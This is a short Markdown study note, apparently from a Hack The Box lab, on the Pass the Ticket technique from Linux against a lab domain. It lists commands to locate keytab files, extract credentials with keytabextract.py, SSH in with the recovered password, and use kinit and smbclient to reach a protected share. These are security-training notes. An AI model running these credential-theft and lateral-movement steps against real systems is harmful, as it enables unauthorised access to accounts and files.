---
title: Pass the Ticket (PtT) from Linux
aliases: []
tags:
- study-notes/ptt
- tool/keytabextract.py
- technique/t1003
- technique/t1008
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: htbanswers.md
related_tools:
- '[[keytabextract.py]]'
- '[[python3]]'
- '[[smbclient]]'
related_techniques:
- '[[T1003.003]]'
- '[[t1008]]'
related_tactics:
- '[[ta0003]]'
related_services: []
related_os:
- '[[/opt/specialfiles/carlos.keytab]]'
- '[[/home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt]]'
related_notes: []
mitre_tactic: TA0003
mitre_technique: T1003.003, T1008
real_path: ''
port: ''
protocol: ''
os: linux
---

# Pass the Ticket (PtT) from Linux

## Description
This note covers the Pass the Ticket (PtT) technique from a Linux perspective, including the steps to gain access to a Linux machine and access protected files using Kerberos tickets.

## Steps to Gain Access
1. **Realm Check**: Use `realm list` to check if the machine is domain-joined.
2. **Keytab File Location**: Use `find / -name *keytab* -ls 2>/dev/null` to locate the keytab file.
3. **Extract Credentials**: Use `python3 ./keytabextract.py /opt/specialfiles/carlos.keytab` to extract the credentials.
4. **SSH into Target Machine**: Use `ssh svc_workstations@inlanefreight.htb@localhost -p 2222` with the extracted password.

## Accessing Protected Files
1. **Kinit Command**: Use `kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt` to obtain a Kerberos ticket.
2. **SMBClient Command**: Use `smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results-all.txt` to list the contents of the protected directory.

## References
- https://academy.hackthebox.com/module/147/section/1657

